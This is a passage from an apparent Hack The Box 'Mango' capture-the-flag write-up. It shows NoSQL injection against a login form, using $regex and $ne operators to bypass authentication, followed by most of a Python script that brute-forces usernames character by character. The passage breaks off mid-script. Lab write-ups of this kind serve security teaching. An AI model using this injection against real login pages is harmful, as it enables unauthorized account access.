    as POST data that gets send to the server with payload of <a style="color:red">^</a> to specify the search for the first letter only, and <a style="color:red">a</a>  because it is the begining of 'admin' account. <br></br>and it looks like we have a successful login too.

    <br></br><img src="/images/hackthebox/mango/8.png" alt=""> <br></br>

    lets try <code>d</code>. <br></br>
    the response status code was not 302 (redirection). 
    Meaning that there is no account name that starts with 'd' in our case.
    
    
    We can enumrate letter by letter or we can automate this with python.
      <br></br>
    Here a python script that will enumerate usernames.<br></br><b>Note:</b> i routed the script traffic to Burp Suite through <code>localhost</code> port <code>8080</code> for debugging purposes. If you are not using burp please remove the lines from 6-14


      <pre>
      <gutter>
        <p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> &nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>1</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D8D9A9;'># python3 nosql-enum.py</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> &nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>2</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>import requests</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> &nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>3</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>import re</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> &nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>4</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>import os</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> &nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>5</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> &nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>6</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D8D9A9;'>#=================================================</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> &nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>7</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D8D9A9;'># to send this script traffic through Burp Suite</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> &nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>8</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>proxy</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>=</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>&#39;http://localhost:8080&#39;</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> &nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>9</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>10</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>os.environ</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>[</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>&#39;http_proxy&#39;</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>] =</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>proxy</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>11</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>os.environ</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>[</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>&#39;HTTP_PROXY&#39;</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>] =</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>proxy</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>12</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>os.environ</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>[</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>&#39;https_proxy&#39;</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>] =</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>proxy</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>13</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>os.environ</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>[</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>&#39;HTTPS_PROXY&#39;</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>] =</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>proxy</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>14</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D8D9A9;'># =================================================</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>15</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>16</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>url</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>=</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>&#39;http://staging-order.mango.htb&#39;</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>17</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>cookies</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>=</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>&#39;PHPSESSID=&#39;</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>18</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>19</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>chars</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>=</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>range</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>(</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>33</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>,</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>127</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>)</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>20</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>21</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>p1</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>=</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>&#39;&#39;</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>22</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>23</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>24</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>def rqst</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>(</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>p1</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>):</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>25</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>data1</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>=</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>&quot;username[</span><span style='font-size:16px;font-family:"Andale Mono";color:#915DF1;'>$regex</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>]=^&quot;</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>+</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>p1</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>+</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>&quot;&amp;password[</span><span style='font-size:16px;font-family:"Andale Mono";color:#915DF1;'>$ne</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>]=&amp;login=login&quot;</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>26</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>r</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>=</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>requests.post</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>(</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>url</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>,</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>data</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>=</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>data1</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>,</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>verify</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>=</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>False</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>,</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>allow_redirects</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>=</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>False</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>,</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>27</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;      &nbsp; &nbsp;&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>headers</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>={</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>&#39;Content-Type&#39;</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>:</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>&#39;application/x-www-form-urlencoded&#39;</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>})</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>28</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>29</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#86AFFF;'>if</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>r.status_code</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>==</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>302</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>:</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>30</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;  &nbsp;&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>P1</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>=</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>p1</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>31</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;  &nbsp;&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>print</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>(</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>&#39;</span><span style='font-size:16px;font-family:"Andale Mono";color:#DFAF82;'>\n</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>found so far: &#39;</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>+</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>p1</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>)</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>32</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>33</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;  &nbsp;&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#86AFFF;'>for</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>i</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#86AFFF;'>in</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>chars</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>:</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>34</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;    &nbsp; &nbsp;&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#86AFFF;'>if</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>chr</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>(</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>i</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>)</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#86AFFF;'>in</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>[</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>&#39;.&#39;</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>,</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>&#39;?&#39;</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>,</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>&#39;*&#39;</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>,</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>&#39;^&#39;</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>,</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>&#39;+&#39;</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>,</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>&#39;&amp;&#39;</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>,</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>&#39;|&#39;</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>]:</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>35</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;      &nbsp;&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>p1</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>=</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>P1</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>+</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>&#39;</span><span style='font-size:16px;font-family:"Andale Mono";color:#DFAF82;'>\\</span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>&#39;</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>+</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>chr</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>(</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>i</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>)</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D8D9A9;'># to escape chars</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>36</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;      &nbsp;&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>rqst</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>(</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>p1</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>)</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>37</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;    &nbsp; &nbsp;&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#86AFFF;'>else</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>:</span></p>
<p style='margin:0cm;margin-bottom:.0001pt;font-size:12px;font-family:"Calibri",sans-serif;'><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'> </span><span style='font-size:16px;font-family:"Andale Mono";color:#84E158;'>38</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;&nbsp;      &nbsp;&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>p1</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>=</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>P1</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>+</span><span style='font-size:16px;font-family:"Andale Mono";color:#EAFFFF;'>&nbsp;</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>chr</span><span style='font-size:16px;font-family:"Andale Mono";color:#868686;'>(</span><span style='font-size:16px;font-family:"Andale Mono";color:#D0D0D0;'>i</span><span 